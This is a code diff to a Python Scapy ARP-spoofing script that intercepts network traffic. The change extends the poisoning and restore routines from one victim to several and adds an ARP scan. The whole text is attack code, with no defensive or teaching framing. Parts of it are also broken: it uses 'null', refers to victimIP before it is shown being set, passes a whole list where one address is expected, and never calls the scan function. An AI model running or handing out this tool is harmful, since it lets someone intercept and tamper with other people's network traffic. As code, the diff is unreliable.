@@ -2,6 +2,21 @@ from scapy.all import *
 import sys
 import os
 import time
+import argparse
+
+
+flag = False
+def scan(ip):
+
+    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+
+    ans, unans = srp(request, timeout=2, retry=1)
+    result = []
+
+    for sent, received in ans:
+        result.append(received.hwsrc)
+
+    return result
 
 try:
     interface = input("[*] Enter Desired Interface: ")
@@ -22,24 +37,37 @@ def enable_ipforwarding():
 enable_ipforwarding()
 print("[*] Enabling IP Forwarding...\n")
 
+print(victimIP)
+if victimIP == null:
+    flag = True
+
+def get_gwmac(IP):
+    return getmacbyip(IP)
 def get_mac(IP):
-     from scapy.layers.l2 import getmacbyip
-     return getmacbyip(IP)
+    result=[]
+    if flag == True:
+        for i in range(0, len(victimIP)):
+            result.append(getmacbyip(victimIP[i]))
+    else:
+        result.append(getmacbyip(IP))
+    return result
     
 
 def reARP(): 
     print ("[*] Restoring Targets...")
     victimMAC = get_mac(victimIP)
-    gatewayMAC = get_mac(gatewayIP)
-    send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
-    send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
+    gatewayMAC = get_gwmac(gatewayIP)
+    for i in range(0, len(victimMAC)):
+        send(ARP(op=2, pdst=victimIP[i], psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
+        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP[i], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC[i]), count=7)
     print("[*] Disabling IP Forwarding...")
     print("[*] Shutting Down...")
     sys.exit(1)
 
 def trick(gm, vm):
-    send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst=vm))
-    send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst=gm))
+    for i in range(0, len(victimIP)):
+        send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst=vm))
+        send(ARP(op=2, psrc=victimIP[i], pdst=gatewayIP, hwdst=gm))
 
 def mitm():
     try:
@@ -49,7 +77,7 @@ def mitm():
         print("[!] Exiting...")
         sys.exit(1)
     try: 
-        gatewayMAC = get_mac(gatewayIP)
+        gatewayMAC = get_gwmac(gatewayIP)
     except Exception:
         print("[!] Couldn't Find Gateway MAC Address")
         print("[!] Exiting...")
@@ -62,6 +90,5 @@ def mitm():
         except KeyboardInterrupt:
             reARP()
             break
-
 
 mitm()
